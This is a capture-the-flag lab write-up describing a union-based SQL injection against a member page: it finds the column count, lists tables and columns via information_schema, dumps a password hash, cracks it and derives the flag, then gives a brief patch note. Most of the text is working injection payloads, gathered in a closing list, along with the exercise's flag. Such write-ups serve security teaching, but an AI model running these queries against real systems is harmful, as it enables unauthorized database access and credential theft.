# Exploit
We visit the url "/index.php?page=member". We try some random input like quote or comment for example and we see that sql show us the error when executing a wrong query. So this page is vulnerable and we are going to use the error log to get what we want.

We try to figure out how many column are used for the result. We use this request and "1 order by n" until we get an error. We can use "1 order by 2" but not "1 order by 3" so we have 2 columns in the query.
We retrieve the database name with the following query "1 union all select 1,database()" and we get "Member_Sql_Injection". We also retrieve the version of sql with "1 union all select 1,version()" and we get "5.5.44-0ubuntu0.12.04.1".

Since this sql version is more than 5.0.0, we can use the schema and use the following query "1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()" to get the table name who is "users". Same thing for the columns name but we use "users" with hex encoded string to avoid error with this query "1 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x7573657273" who give us "user_id,first_name,last_name,town,country,planet,Commentaire,countersign". We check the "Commentaire" column with this query "1 union all select 1,group_concat(Commentaire,0x0a) from users", we get "Decrypt this password -> then lower all the char. Sh256 on it and it's good !".

We retrieve the "countersign" column with "1 union all select 1,group_concat(countersign,0x0a) from users", we get "5ff9d0165b4f92b14994e5c685cdce28" and we follow the instructions. We use [md5decrypt.net](https://md5decrypt.net), get "FortyTwo", we lowercase all the characters and use sha256 with 'fortytwo': 

```bash
echo -n fortytwo | shasum -a 256
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  -
```

The flag is **10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5**

```
All the queries used for this exploit:
1 order by 2
1 union all select 1,version()
1 union all select 1,2
1 union all select 1,database()
1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()
1 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x7573657273
1 union all select 1,group_concat(Commentaire,0x0a) from users
1 union all select 1,group_concat(countersign,0x0a) from users
```

# Patch
Just prepare the request and sanitize user input (with a filter for characters for example).